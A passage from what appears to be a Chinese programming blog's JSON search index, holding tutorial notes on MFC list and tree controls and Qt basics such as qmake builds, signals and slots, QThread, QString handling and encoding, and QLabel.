","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:2:2","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"List Control 设置列表控件属性中的View为Report 绑定CListCtrl这个类型 //可向列表控件的项添加4字节的附加数据 BOOL SetItemData( int nItem, DWORD dwData ); DWORD GetItemData( int nItem ) const; ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:3:0","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"初始化 //在OnInitDialog这个函数中写代码 //初始化列表控件 //插入表头 int nColIdx = 0; m_LstCtrl.InsertColumn(nColIdx++, \"姓名\"); m_LstCtrl.InsertColumn(nColIdx++, \"性别\"); m_LstCtrl.InsertColumn(nColIdx++, \"爱好\"); //添加内容 int nItemIdx = 0;//列表控件的行 //插入第一项 m_LstCtrl.InsertItem(nItemIdx, \"Luo\"); int nSubItemIdx = 1;//列表控件的列 m_LstCtrl.SetItemText(nItemIdx, nSubItemIdx++, \"男\"); m_LstCtrl.SetItemText(nItemIdx, nSubItemIdx++, \"敲代码\"); //设置整行选择 DWORD dwStyle = m_LstCtrl.GetExtendedStyle(); m_LstCtrl.SetExtendedStyle(dwStyle | LVS_EX_FULLROWSELECT); //设置所有列根据内容自动调整宽度 //获取表头 CHeaderCtrl* pHeaderCtrl = m_LstCtrl.GetHeaderCtrl(); //通过表头获取有多少列 int nColNum = pHeaderCtrl-\u003eGetItemCount(); for (int i = 0; i \u003c nColNum;i++) { m_LstCtrl.SetColumnWidth(i, LVSCW_AUTOSIZE_USEHEADER); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:3:1","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"获取列表控件选中项的文本 //获取当前选中的行的索引值 int nItemIdx = m_LstCtrl.GetSelectionMark(); //获取选中行的文本信息 CString csName = m_LstCtrl.GetItemText(nItemIdx, 0); CString csGender = m_LstCtrl.GetItemText(nItemIdx, 1); CString csLike = m_LstCtrl.GetItemText(nItemIdx, 2); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:3:2","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"右键弹出菜单 新建一个菜单资源 响应菜单消息 打开类向导,在命令栏中找到List Control对应的ID 在右边的消息中,双击NM_RCLICK 添加代码 LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast\u003cLPNMITEMACTIVATE\u003e(pNMHDR); // TODO: 在此添加控件通知处理程序代码 *pResult = 0; //坐标转换 m_LstCtrl.ClientToScreen(\u0026pNMItemActivate-\u003eptAction); //弹出菜单 CMenu cMn; cMn.LoadMenu(IDR_MENU1);//从资源加载菜单 CMenu* pSubMenu = cMn.GetSubMenu(0);//获取子菜单 pSubMenu-\u003eTrackPopupMenu(TPM_LEFTALIGN, pNMItemActivate-\u003eptAction.x, pNMItemActivate-\u003eptAction.y, this);//最后一个参数类型CWnd*,填写处理这一消息的窗口指针 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:3:3","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"Tree Control 绑定CTreeCtrl这个类型 //可向树控件中的项添加4字节的附加数据 BOOL SetItemData( HTREEITEM hItem, DWORD dwData ); DWORD GetItemData( HTREEITEM hItem ) const; ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:4:0","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"设置风格 //获取树控件的句柄 HWND hwndTree = GetDlgItem(m_hWnd, IDC_TREE); //设置树控件的风格 DWORD dwStyle = GetWindowLong(hwndTree, GWL_STYLE); dwStyle = dwStyle | TVS_HASLINES | TVS_LINESATROOT | TVS_HASBUTTONS | TVS_SHOWSELALWAYS; SetWindowLong(hwndTree, GWL_STYLE, dwStyle); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:4:1","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"添加数据 HTREEITEM InsertItem( LPTVINSERTSTRUCT lpInsertStruct ); HTREEITEM InsertItem(UINT nMask, LPCTSTR lpszItem, int nImage, int nSelectedImage, UINT nState, UINT nStateMask, LPARAM lParam, HTREEITEM hParent, HTREEITEM hInsertAfter ); HTREEITEM InsertItem( LPCTSTR lpszItem, HTREEITEM hParent = TVI_ROOT, HTREEITEM hInsertAfter = TVI_LAST ); HTREEITEM InsertItem( LPCTSTR lpszItem, int nImage, int nSelectedImage, HTREEITEM hParent = TVI_ROOT, HTREEITEM hInsertAfter = TVI_LAST); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:4:2","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"获取选中节点 HTREEITEM GetSelectedItem( ); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:4:3","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"Qt ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:0:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"介绍 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:1:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt安装 https://download.qt.io/ 目前我下载的是5.12.10版本 https://download.qt.io/archive/qt/5.12/5.12.10/ VS插件安装: https://download.qt.io/archive/vsaddin/ ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:1:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"第一个Qt项目 工程规范化 创建一个文件夹Lesson,然后分别创建bin、doc、lib、src文件夹. D:. │ └─Lesson ├─bin ├─doc ├─lib └─src 新建一个qt工程,目录放在src中. 目录文件介绍 D:. │ ├─bin ├─doc ├─lib └─src ├─build-QtTest-Desktop_Qt_5_12_10_MSVC2017_32bit-Debug │ │ .qmake.stash │ │ Makefile │ │ Makefile.Debug │ │ Makefile.Release │ │ ui_widget.h //这是qt设计器代码 │ │ │ ├─debug │ │ main.obj │ │ moc_predefs.h //qt中与信号槽相关的代码 │ │ moc_widget.cpp │ │ moc_widget.obj │ │ QtTest.exe │ │ QtTest.ilk │ │ QtTest.pdb │ │ QtTest.vc.pdb │ │ widget.obj │ │ │ └─release └─QtTest main.cpp QtTest.pro //这是qt的项目文件,用来生成makefile文件. QtTest.pro.user //这是qt的编译环境,可删掉,重新指定编译环境. widget.cpp widget.h widget.ui 需要注意的是,在qt中创建的.h .cpp文件的文件名要小写,为了跨平台. 在windows平台,文件名大小写不敏感,但在其他平台大小写可能是敏感的. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:1:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QMake ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:2:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt程序编译步骤 编译pro生成makefile jom或make编译makefile ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:2:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"jom或者make jom下载链接:https://wiki.qt.io/Jom 生成界面源码 uic.exe widget.ui -o ui_widget.h 生成信号槽代码 moc.exe widget.h moc_widget.cpp ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:2:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"控制台手工编译Qt程序 首先要配置要qmake和jom的环境变量. 准备源文件 func1.h #include \u003cstdio.h\u003evoid func1(); func1.cpp #include \"func1.h\" void func1(){ printf(\"func1\\n\"); } main.cpp #include \u003cstdlib.h\u003e#include \u003cstdio.h\u003e#include \"func1.h\" int main(){ func1(); printf(\"main\\n\"); system(\"pause\"); return 0; } 编写pro文件 LuoQt.pro SOURCES += \\ main.cpp \\ func1.cpp HEADERS += \\ func1.h CONFIG += console 这一步也可以利用qmake自动生成 //命令行执行以下语句,添加VC环境 \"D:/VS2019/VS2019/VC/Auxiliary/Build/vcvarsx86_amd64.bat\" //执行qmake语句 qmake -project 编译 build.bat call \"D:/VS2019/VS2019/VC/Auxiliary/Build/vcvarsx86_amd64.bat\" qmake -o makefile LuoQt.pro jom /f makefile pause 控制台编译Qt.7z ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:2:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt项目转VS工程 有两种方式. 命令行 //添加VC环境 \"D:/VS2019/VS2019/VC/Auxiliary/Build/vcvarsx86_amd64.bat\" //生成vcxproj文件 qmake -tp vc luoQt.pro 利用插件打开pro项目 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:2:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"信号槽 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"介绍 信号函数:只发送不需要知道接收者. 槽函数:只接收不管通信.在主线程中调用,不要在其他线程中调,会崩!!! QObject来绑定. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"原理 绑定信号函数与槽函数. 调用信号函数(将信号写入队列中). 主线程从队列中获取信号. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"通过QtCreator设置信号槽 有以下两种方式: 拖动. 添加,点下方的加号进行添加. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"手动添加槽函数 Q_OBJECT 如果一个类中,我们添加了信号槽,我们就要定义Q_OBJECT这个宏,这样的话,QT的moc程序才会帮我们生成代码. 示例 class luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); //信号函数,只声明即可 signals: void TstSignal(); //槽函数声明 public slots: void TstSlot(); private: Ui::luoqtClass ui; }; //槽函数定义 void luoqt::TstSlot() { printf(\"Hello TstSlot\\n\"); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"利用QtCreator绑定信号槽 将上述写的槽函数绑定到按钮的点击事件中 新建一个按钮,利用QtCreator拖动来设置. 点击上述编辑按钮后,添加新建的槽函数. 将按钮点击和刚创建的槽函数绑定起来. 这样的话,就可以了,测试的时候,我们将控制台打开. 将上述写的信号函数和槽函数绑定起来 利用QtCreator拖动来设置,在空白的地方拖一下就可以了. 添加信号函数和槽函数. 绑定. Qt生成代码分析 上面这些操作Qt帮我们生成了很多的代码, 生成Connect代码. 将信号和槽函数转化为字符串. moc生成的槽函数调用代码. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:5","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"手动绑定信号槽 新建一个按钮. 添加信号和槽函数. //luoqt.h class luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); //信号函数 signals: void TstSignal(); //槽函数 public slots: void TstSlot(); void TstConnect(); private: Ui::luoqtClass ui; }; 使用connect函数进行绑定. //luoqt.cpp luoqt::luoqt(QWidget *parent) : QWidget(parent) { ui.setupUi(this); //使用connect进行绑定 //发送者 信号函数 接收者 槽函数 QObject::connect(ui.btn_connect, SIGNAL(TstSignal()), this, SLOT(TstConnect())); } void luoqt::TstSlot() { printf(\"Hello TstSlot\\n\"); } void luoqt::TstConnect() { printf(\"Hello TstConnect\\n\"); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:6","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QThread 新建一个类,继承QThread,重写run函数即可. #include \u003cQThread\u003eclass LuoThread : public QThread { public: void run() { //休眠5s QThread::msleep(5000); } }; //调用,调start,就会自动调用上述的run函数 LuoThread luoThread; luoThread.start(); //或者使用下面这种 (new LuoThread())-\u003estart(); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:4:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QWidget 所有用户界面对象的基类. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:5:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"使用示例 假设我们要实现的是,程序启动的时候,运行的窗口是我们新建的类所关联的一个窗口,然后5s之后窗口隐藏. 新建一个类,继承QWidget. //LuoQWidget.h #include \u003cQWidget\u003eclass LuoQWidget : public QWidget { Q_OBJECT public: LuoQWidget(); ~LuoQWidget(); signals: void LuoHide(); }; //LuoQWidget.cpp LuoQWidget::LuoQWidget() { //手动绑定信号槽 QObject::connect(this, SIGNAL(LuoHide()), this, SLOT(hide())); } LuoQWidget::~LuoQWidget() { } 新建一个类,继承QThread. //LuoThread.h #include \"LuoQWidget.h\"#include \u003cQThread\u003eclass LuoThread : public QThread { public: LuoThread(LuoQWidget* pQWidget) { m_pQWidget = pQWidget; } public: void run() { //休眠5s QThread::msleep(5000); //发信号 m_pQWidget-\u003eLuoHide(); } private: LuoQWidget* m_pQWidget; }; main函数中进行调用. //main.cpp #include \u003cQtWidgets/QApplication\u003e#include \"LuoQWidget.h\"#include \"LuoThread.h\" int main(int argc, char *argv[]) { QApplication a(argc, argv); LuoQWidget w; w.setWindowTitle(\"LuoQWidget\"); w.show(); LuoThread luoThread(\u0026w); luoThread.start(); return a.exec(); } 这里需要注意的是,不要在其他线程中直接调用槽函数,否则会崩,我们可以绑定一个信号和槽函数,然后在其他线程中发信号. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:5:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"相关函数 获取窗口坐标和尺寸 QRect \u0026QWidget::geometry(); void QWidget::setGeometry(int ax, int ay, int aw, int ah); QWidget w; w.x(); w.y(); w.width(); w.height(); void QWidget::move(int ax, int ay); void QWidget::resize(int w, int h); 窗口状态 void setWindowState(Qt::WindowStates state); //参数如下 enum WindowState { WindowNoState = 0x00000000, WindowMinimized = 0x00000001, WindowMaximized = 0x00000002, WindowFullScreen = 0x00000004, WindowActive = 0x00000008 }; //Qt定义的槽函数 void showMinimized(); void showMaximized(); void showFullScreen(); void showNormal(); 定制窗口 QWidget w; //无边框 w.setWindowFlags(Qt::FramelessWindowHint); //去掉最大最小化按钮 //w.setWindowFlag(Qt::WindowMinimizeButtonHint, false); //w.setWindowFlag(Qt::WindowMaximizeButtonHint, false); //标题栏保留,去除所有按钮 w.setWindowFlags(Qt::WindowTitleHint | Qt::CustomizeWindowHint); w.show(); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:5:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QString ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"空判断 QString qstr; if (qstr.isEmpty()) { printf(\"qstr is empty\\n\"); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"字符串拼接 QString qstr1 = \"Luo\"; QString qstr2 = \"Hun\"; qstr1 += qstr2; //qstr1, LuoHun ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"字符串格式化 QString qstr; qstr = QString(\"name = %1, arg = %2 %3\") .arg(\"Luo\", 2) .arg(56) .arg(10, 0, 16); //qstr, name = Luo, arg = 56 a ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"单个整型字符串互转 //单个整型转字符串 QString qstrNum = QString::number(5566); //字符串转整型 int num = qstrNum.toInt(); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"提取字符串 QString qstr = \"Luo5566,Hun8899\"; QString qstrLeft = qstr.left(5); //qstrLeft, Luo55 QString qstrMid = qstr.mid(2, 6); //qstrMid, o5566, QString qstrRight = qstr.right(5); //qstrRight, n8899 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:5","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"字符串查找 QString qstr = \"Luo5566,Hun8899\"; int n = qstr.indexOf(\"55\"); //n, 3 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:6","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"检查字符串是否以XXX开始或结束 QString qstr = \"Luo5566Hun\"; if (qstr.startsWith(\"luo\", Qt::CaseInsensitive)) { printf(\"startsWith True\\n\"); } if (qstr.endsWith(\"Hun\", Qt::CaseSensitive)) { printf(\"endsWith True\\n\"); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:7","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"字符串替换 QString qstr = \"Luo5566,5566Hun8899\"; QString qstr1 = qstr.replace(\"5566\", \"2233\"); //qstr1, Luo2233,2233Hun8899 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:8","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"字符串两端删除空白符 QString qstr = \" Luo5566,Hun8899 \"; QString qstr1 = qstr.trimmed(); //qstr1, Luo5566,Hun8899 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:9","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"分割字符串 QString qstr = \"Luo5566:5566Hun:8899\"; QStringList qLst = qstr.split(\":\"); for (QString str: qLst) { printf(\"%s\\n\", str.toStdString().c_str()); } //Luo5566 //5566Hun //8899 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:10","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"VS中解决中文乱码 QString内部采用UTF-16编码,构造函数QString::QString(const char *str)默认使用fromUtf8(),将str所指的执行字符集从UTF-8转码成UTF-16. VS默认创建的源码文件格式为GBK. QtCreator默认创建的源码文件格式为UTF-8. 法一 使用QStringLiteral #include \u003cQDebug\u003e#include \u003cQStringLiteral\u003e#include \u003cQMessageBox\u003e int main(int argc, char *argv[]) { QApplication a(argc, argv); QWidget w; QString qstr = QStringLiteral(\"中文\"); qDebug() \u003c\u003c qstr; QMessageBox::information(NULL, \"Luo\", qstr); w.show(); return a.exec(); } 需要注意的是,如果源文件本身的格式为UTF-8,再用QStringLiteral这个宏进行转换就会产生乱码. 法二 手动将该源文件格式转换为UTF-8 #include \u003cQDebug\u003e#include \u003cQStringLiteral\u003e#include \u003cQMessageBox\u003e int main(int argc, char *argv[]) { QApplication a(argc, argv); QWidget w; QString qstr = \"中文\"; qDebug() \u003c\u003c qstr; QMessageBox::information(NULL, \"Luo\", qstr); w.show(); return a.exec(); } 法三 使用代码修改源文件字符集为UTF-8 #include \u003cQDebug\u003e#include \u003cQStringLiteral\u003e#include \u003cQMessageBox\u003e#pragma execution_character_set(\"utf-8\") int main(int argc, char *argv[]) { QApplication a(argc, argv); QWidget w; QString qstr = \"中文\"; qDebug() \u003c\u003c qstr; QMessageBox::information(NULL, \"Luo\", qstr); w.show(); return a.exec(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:11","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"编码方式转换 设置本地字符集 #include \u003cQTextCodec\u003eQTextCodec::setCodecForLocale(QTextCodec::codecForName(\"GBK\"));//或UTF-8 GBK-\u003eUTF-8 通常在VS中使用QString::fromLocal8Bit char* szSrc = \"中文测试\"; //VS本地编码默认为GBK QString qstr = QString::fromLocal8Bit(szSrc); UTF-8-\u003eGBK 通常在QtCreator中使用QString::fromUtf8 const char* szSrc = \"中文测试\"; //QtCreator本地编码默认为UTF-8 QString qstr = QString::fromUtf8(szSrc); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:12","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QString与WinAPI 将QString中存放的中文在WinAPI中使用. char* szSrc = \"中文测试\"; //VS 中使用QString::fromLocal8Bit //QtCreator中使用QString::fromUtf8 QString qstr = QString::fromLocal8Bit(szSrc); ::MessageBoxA(NULL, qstr.toLocal8Bit(), \"MessageBoxA\", MB_OK); ::MessageBoxW(NULL, qstr.toStdWString().c_str(), L\"MessageBoxW\", MB_OK); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:13","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QLabel ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:7:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"主要成员函数 void setText(QString); //设置label框内的文本. void hide(); //隐藏label框. void setBuddy(QWidget*); //把另一个部件设为label框的伙伴，方便快捷使用. void clear(); //清空label框内所有内容. void setPixmap(QPixmap(QString)); //设置图片. void setMovie(QMovie*); //设置电影. void setScaledContents(bool); //设置是否按比例填充满整个label框(非常重要) void setToolTip(QString); //设置信息提示,鼠标放在label框上面会自动跳出文字. void setToolTipDuration(int); //设置信息提示的持续时间，单位是毫秒. void setAlignment(Qt::Alignment); //设置label框的对齐格式. void setStyleSheet(QString); //设置label框的样式. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:7:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"播放Gif动画 QLabel* label = new QLabel(this); label-\u003esetGeometry(0, 0, 400, 400); QMovie* mov = new QMovie(\"tst.gif\"); label-\u003esetMovie(mov); label-\u003eshow(); mov-\u003estart(); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:7:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"文本格式 两种格式: PlainText, \\n换行. RichText, 支持html. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:7:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Url链接 首先选择RichText. \u003cbr\u003e是换行. QtCreator有点Bug,我目前使用的是5.12.0,要在文本中输入\u003cbr\u003e后双击文本,才可以弹出下面的框 通过上图插入链接,Qt已经定义好了两个信号,然后就可以写槽函数来处理相应的事件了. //鼠标点击url链接信号 void linkActivated(QString); //鼠标滑过url链接信号 void linkHovered(QString)); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:7:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"属性设置 通过勾选上述标志,可设置QLabel可选择可编辑等. 